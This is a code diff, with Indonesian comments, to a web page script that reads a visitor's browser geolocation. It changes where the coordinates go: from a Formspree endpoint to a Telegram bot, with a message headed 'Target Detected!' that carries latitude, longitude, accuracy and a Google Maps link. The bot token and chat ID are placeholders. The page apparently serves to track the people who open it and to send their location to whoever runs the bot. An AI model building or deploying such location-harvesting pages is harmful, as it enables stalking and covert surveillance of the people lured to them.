@@ -24,8 +24,9 @@
   </div>
 
   <script>
-    // URL Endpoint Formspree Anda
-    const FORMSPREE_URL = 'https://formspree.io/f/mrpgbjwp';
+    // --- MASUKKAN TOKEN BOT DAN CHAT ID ANDA DI SINI ---
+    const TELEGRAM_BOT_TOKEN = 'MASUKKAN_TOKEN_BOT_ANDA_DISINI';
+    const TELEGRAM_CHAT_ID = 'MASUKKAN_CHAT_ID_ANDA_DISINI';
 
     function getLocation() {
       const statusDiv = document.getElementById('status');
@@ -48,18 +49,20 @@
       const accuracy = position.coords.accuracy;
       const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
 
-      // Mengirim data menggunakan metode POST ke Formspree
-      fetch(FORMSPREE_URL, {
+      // Format pesan yang akan masuk ke Telegram
+      const message = `🎯 Target Terdeteksi!\n\n📍 Latitude: ${lat}\n📍 Longitude: ${lon}\n🎯 Akurasi: ${accuracy} meter\n🗺️ Google Maps: ${googleMapsUrl}`;
+
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+      // Mengirim data langsung ke Telegram secara real-time
+      fetch(url, {
         method: 'POST',
         headers: {
-          'Accept': 'application/json',
           'Content-Type': 'application/json'
         },
         body: JSON.stringify({
-          latitude: lat,
-          longitude: lon,
-          akurasi: accuracy + ' meter',
-          google_maps: googleMapsUrl
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message
         })
       }).then(response => {
         if (response.ok) {
